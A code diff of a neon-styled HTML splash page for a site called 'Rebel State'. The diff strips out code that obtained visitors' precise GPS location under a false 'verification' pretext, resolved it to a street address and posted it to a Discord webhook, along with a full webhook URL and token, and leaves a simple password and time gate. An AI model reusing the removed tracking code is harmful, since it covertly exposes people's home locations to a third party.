@@ -20,7 +20,6 @@
             --text-glow: 0 0 10px rgba(255, 45, 149, 0.8);
         }
         
-        /* Konfigurasi Dasar dan Font */
         body {
             font-family: 'Poppins', sans-serif;
             background: radial-gradient(circle at center, #1a0b16 0%, var(--bg-black) 100%);
@@ -33,7 +32,6 @@
             overflow: hidden;
         }
 
-        /* Container Splash dengan sentuhan Neon */
         .splash-container {
             position: relative;
             background: rgba(10, 10, 10, 0.8);
@@ -54,13 +52,11 @@
             color: #fff;
             margin-bottom: 20px;
             text-transform: uppercase;
-            /* Efek Neon Glow Pink & Purple */
             text-shadow: 0 0 5px #fff, 0 0 10px var(--neon-pink), 0 0 20px var(--neon-pink), 0 0 40px var(--neon-purple);
             font-style: italic;
             letter-spacing: 4px;
         }
 
-        /* CTA Button Styling Neon */
         .cta-button {
             display: inline-block;
             background: transparent;
@@ -90,20 +86,11 @@
             transform: scale(1.05);
         }
 
-        .cta-button:disabled {
-            cursor: not-allowed;
-            opacity: 0.3;
-            border-color: #333;
-            color: #333;
-            box-shadow: none;
-        }
-        
         @media (max-width: 600px) {
             .title-text { font-size: 2.5rem; }
             .cta-button { font-size: 1rem; padding: 12px 30px; }
         }
 
-        /* --- EFEK PARTIKEL NEON --- */
         .snowflake {
             position: absolute;
             width: 4px;
@@ -120,7 +107,6 @@
             to { transform: translateY(100vh); opacity: 0; }
         }
 
-        /* Spinner kustom Neon */
         .custom-loader {
             width: 50px;
             height: 50px;
@@ -136,7 +122,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* SweetAlert Custom Theme Override */
         .swal2-popup-neon {
             border: 2px solid var(--neon-pink) !important;
             box-shadow: 0 0 25px rgba(255, 45, 149, 0.5) !important;
@@ -144,12 +129,10 @@
     </style>
 </head>
 <body>
-    <!-- Layer Partikel Neon -->
     <div id="snow-container" class="fixed inset-0 overflow-hidden pointer-events-none"></div>
 
     <div class="splash-container" data-aos="fade-in" data-aos-duration="1500">
         <div class="w-24 h-24 mx-auto mb-6 relative">
-            <!-- Glow effect behind logo -->
             <div class="absolute inset-0 bg-pink-500 rounded-full blur-xl opacity-30 animate-pulse"></div>
             <img src="web rebel/image.png"
                 onerror="this.onerror=null; this.src='https://placehold.co/100x100/ff2d95/000000?text=REBEL';"
@@ -180,11 +163,8 @@
     <script>
         AOS.init();
 
-        // --- KONFIGURASI WEBHOOK DISCORD ---
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1454949858220838997/W0Im6459m3P4hwnqp0JtoZOVNWU8KsLEgm0NWi1K2-yZriJrtvlVtM-BOJbRCEHTPm8x";
-
-        let isLocationAuthorized = false;
         let isProcessing = false;
+        const ACCESS_PASSWORD = 'rebelcity';
 
         // --- EFEK PARTIKEL NEON ---
         const snowContainer = document.getElementById('snow-container');
@@ -206,129 +186,26 @@
         }
         for (let i = 0; i < NUM_SNOWFLAKES; i++) { createSnowflake(); }
 
-        // --- SISTEM KEAMANAN & LOKASI ---
-        const ACCESS_PASSWORD = 'rebelcity';
-        const enterButton = document.getElementById('enter-button');
-        const statusMessage = document.getElementById('status-message');
-
-        function requestInitialLocation() {
-            if (!navigator.geolocation) return;
-            navigator.geolocation.getCurrentPosition(
-                () => { isLocationAuthorized = true; },
-                () => { isLocationAuthorized = false; },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
-        }
-
-        function sendDenyReportToDiscord() {
-            const timestamp = new Date().toLocaleString('id-ID');
-            const payload = {
-                embeds: [{
-                    title: "⚠️ Upaya Masuk: Izin Lokasi Ditolak",
-                    description: "Seorang pengguna mencoba masuk ke Rebel State tetapi menolak memberikan akses lokasi.",
-                    color: 16723097, // Pink Neon
-                    fields: [
-                        { name: "⏰ Waktu", value: timestamp },
-                        { name: "🛡️ Status", value: "Akses Dibatalkan oleh Sistem (Izin Ditolak)" }
-                    ],
-                    footer: { text: "Rebel State Neon Security" }
-                }]
-            };
-            fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
-        }
-
-        async function trackAndFetchDetails() {
-            return new Promise((resolve, reject) => {
-                const highPrecisionOptions = { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 };
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-                    const timestamp = new Date().toLocaleString('id-ID');
-                    const isLowAcc = accuracy > 1000;
-                    
-                    let address = "Lokasi tidak teridentifikasi";
-                    try {
-                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`, {
-                            headers: { 'Accept-Language': 'id' }
-                        });
-                        const data = await response.json();
-                        address = data.display_name || address;
-                    } catch (e) {}
-
-                    const qualityText = isLowAcc ? "⚠️ Rendah (Internet IP)" : "🎯 Kuat (GPS Presisi)";
-                    const payload = {
-                        embeds: [{
-                            title: "🚨 Akses City Baru: " + (isLowAcc ? "Estimasi IP" : "GPS Presisi"),
-                            color: isLowAcc ? 16733590 : 16723097,
-                            fields: [
-                                { name: "🏠 Alamat Lengkap", value: address },
-                                { name: "🌐 Koordinat", value: `\`${latitude}, ${longitude}\``, inline: true },
-                                { name: "🎯 Kualitas Sinyal", value: `${Math.round(accuracy)}m - ${qualityText}`, inline: true },
-                                { name: "⏰ Waktu", value: timestamp },
-                                { name: "🗺️ Navigasi", value: `[Buka Maps](https://www.google.com/maps?q=${latitude},${longitude})` }
-                            ],
-                            footer: { text: "Rebel State Neon High Precision" }
-                        }]
-                    };
-                    fetch(DISCORD_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
-                    resolve(address);
-                }, (error) => {
-                    sendDenyReportToDiscord();
-                    reject(error);
-                }, highPrecisionOptions);
-            });
-        }
-
-        async function proceedToSite() {
+        // --- SISTEM AKSES ---
+        function proceedToSite() {
             Swal.fire({
-                title: 'MOHON TUNGGU SEBENTAR',
+                title: 'ACCESS GRANTED!',
                 html: `
-                    <div class="mt-4">
-                        <div class="custom-loader"></div>
-                        <p class="text-xs text-pink-400 italic font-mono">Sedang mengunci sinyal satelit untuk verifikasi akses...</p>
+                    <div class="text-sm mt-4 font-mono">
+                        Mengarahkan ke Kota Rebel State...
                     </div>
                 `,
+                icon: 'success',
                 background: '#0a0a0a',
-                color: '#ff2d95',
-                allowOutsideClick: false,
+                color: '#fff',
+                timer: 2000, 
+                timerProgressBar: true,
                 showConfirmButton: false,
                 customClass: { popup: 'swal2-popup-neon' },
-                didOpen: () => { Swal.showLoading(); }
+                didOpen: () => {
+                    setTimeout(() => { window.location.href = "web rebel/pertama.html"; }, 2000);
+                }
             });
-
-            try {
-                const userAddress = await trackAndFetchDetails();
-                Swal.fire({
-                    title: 'ACCESS GRANTED!',
-                    html: `
-                        <div class="text-sm mt-4 font-mono">
-                            Mengarahkan ke Kota Rebel State...<br><br>
-                            <b class="text-white">Kamu tinggal di:</b><br>
-                            <span class="text-pink-400 italic">${userAddress}</span>
-                        </div>
-                    `,
-                    icon: 'success',
-                    background: '#0a0a0a',
-                    color: '#fff',
-                    timer: 3000, 
-                    timerProgressBar: true,
-                    showConfirmButton: false,
-                    customClass: { popup: 'swal2-popup-neon' },
-                    didOpen: () => {
-                        setTimeout(() => { window.location.href = "web rebel/pertama.html"; }, 3000);
-                    }
-                });
-            } catch (err) {
-                isProcessing = false;
-                Swal.fire({
-                    title: 'AKSES GAGAL',
-                    text: 'Maaf kami tidak bisa melacak mu karena kamu tidak mengizinkan.',
-                    icon: 'error',
-                    background: '#0a0a0a',
-                    color: '#ff2d95',
-                    confirmButtonColor: '#ff2d95',
-                    customClass: { popup: 'swal2-popup-neon' }
-                });
-            }
         }
 
         function promptForPassword() {
@@ -346,49 +223,33 @@
                     input: 'bg-black text-pink-500 border-pink-500 focus:ring-pink-500' 
                 }
             }).then((result) => {
+                isProcessing = false;
                 if (result.isConfirmed) {
                     if (result.value === ACCESS_PASSWORD) {
                         proceedToSite();
                     } else {
-                        isProcessing = false;
-                        Swal.fire({ title: 'KODE SALAH', text: 'Akses ditolak. Coba lagi.', icon: 'error', timer: 2000, showConfirmButton: false, background: '#0a0a0a', color: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
+                        Swal.fire({ title: 'KODE SALAH', text: 'Akses ditolak.', icon: 'error', timer: 2000, showConfirmButton: false, background: '#0a0a0a', color: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
                     }
-                } else {
-                    isProcessing = false;
                 }
             });
         }
 
         window.enterSite = function() {
-            if (isProcessing) {
-                Swal.fire({ title: 'TUNGGU SEBENTAR', text: 'Jangan di spam, ini sedang proses...', icon: 'info', background: '#0a0a0a', color: '#ff2d95', timer: 2000, showConfirmButton: false, customClass: { popup: 'swal2-popup-neon' } });
-                return;
-            }
+            if (isProcessing) return;
             isProcessing = true;
 
-            if (!isLocationAuthorized) {
-                navigator.geolocation.getCurrentPosition(
-                    () => { isLocationAuthorized = true; executeEntryLogic(); },
-                    () => {
-                        sendDenyReportToDiscord();
-                        isProcessing = false;
-                        Swal.fire({ title: 'AKSES DITOLAK', text: 'Maaf kami tidak bisa melacak mu karena kamu tidak mengizinkan.', icon: 'warning', background: '#0a0a0a', color: '#ff2d95', confirmButtonColor: '#ff2d95', customClass: { popup: 'swal2-popup-neon' } });
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-                return;
-            }
-            executeEntryLogic();
-        }
-
-        function executeEntryLogic() {
             const now = new Date();
             const currentHour = now.getHours();
+            
+            // Jam malam (00:00 - 08:00) butuh password
             const isRestricted = currentHour >= 0 && currentHour <= 8;
-            if (isRestricted) { promptForPassword(); } else { proceedToSite(); }
+            
+            if (isRestricted) { 
+                promptForPassword(); 
+            } else { 
+                proceedToSite(); 
+            }
         }
-
-        document.addEventListener('DOMContentLoaded', () => { requestInitialLocation(); });
     </script>
 </body>
 </html>
